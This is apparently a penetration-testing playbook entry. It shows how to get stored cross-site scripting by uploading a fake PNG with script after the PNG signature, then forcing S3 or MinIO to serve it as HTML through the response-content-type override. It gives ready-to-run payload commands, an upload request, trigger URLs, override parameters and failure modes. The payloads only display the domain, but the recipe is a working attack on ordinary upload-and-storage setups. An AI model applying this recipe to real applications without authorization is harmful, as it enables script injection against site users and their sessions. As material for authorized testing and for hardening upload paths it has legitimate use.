# PNG Upload to XSS via S3/MinIO `response-content-type`

## Context

Use when:

- The application accepts PNG uploads.
- Uploaded files are served from S3, MinIO, or S3-compatible storage.
- Upload validation may only check extension, multipart MIME, or PNG magic bytes.
- Object retrieval accepts response header override query parameters.

## Minimal Payload

```bash
printf '\x89PNG\r\n\x1a\n<script>document.body.textContent=document.domain</script>' > test.png
```

This is not a valid PNG. It only starts with the 8-byte PNG signature:

```text
89 50 4E 47 0D 0A 1A 0A
```

## Upload Test

```bash
curl -i -X POST 'https://target/upload' \
  -F 'file=@test.png;filename=test.png;type=image/png'
```

The application may return:

```json
{"url":"/images/uploads/<key>.png"}
```

## Trigger URL

```text
https://target/images/uploads/<key>.png?response-content-type=text/html
```

Optional rendering helper:

```text
https://target/images/uploads/<key>.png?response-content-type=text/html&response-content-disposition=inline
```

## Expected Signal

Normal URL:

```http
Content-Type: image/png
X-Content-Type-Options: nosniff
```

Override URL:

```http
Content-Type: text/html
X-Content-Type-Options: nosniff
```

If the browser receives `text/html`, the bytes after the PNG signature are parsed as HTML.

## Why It Works

The upload path and download path use different trust decisions:

1. Upload validation sees the PNG signature and accepts the file.
2. Storage preserves the attacker-controlled bytes.
3. The object download path lets the requester override `Content-Type`.
4. Browser execution follows the declared `Content-Type: text/html`.

`nosniff` does not block this because the browser is not guessing HTML; the server explicitly declares HTML.

## Useful Override Parameters

- `response-content-type=text/html` - primary XSS primitive.
- `response-content-disposition=inline` - can force render instead of download if honored.
- `response-content-type=image/svg+xml` - useful if SVG parser behavior matters.
- `response-content-type=application/xhtml+xml` - alternate active XML/HTML parser.
- `response-content-encoding=gzip` - edge-case parser/decompression testing.
- `response-cache-control=no-store` - helps avoid cached failed tests.

## Failure Modes

- Upload parser fully validates and rejects malformed PNG structure.
- Server re-encodes images before storing them.
- Object proxy strips `response-*` override parameters.
- Object is served from a separate cookieless origin, limiting same-origin impact.
- Sensitive cookies are `HttpOnly`, so `document.cookie` does not expose them.
- Presigned URL rejects added parameters because they were not included in the signature.
- CSP blocks inline script, though many raw object responses do not carry the app CSP.

## Safer Proof Payload

Use a non-secret proof before testing impact:

```bash
printf '\x89PNG\r\n\x1a\n<script>document.title="xss:"+document.domain;document.body.textContent=document.title</script>' > proof.png
```

Confirm execution by observing the page title/body in a browser.

Do not store live flags, cookies, tokens, private target URLs, or real secrets in reusable payload files.
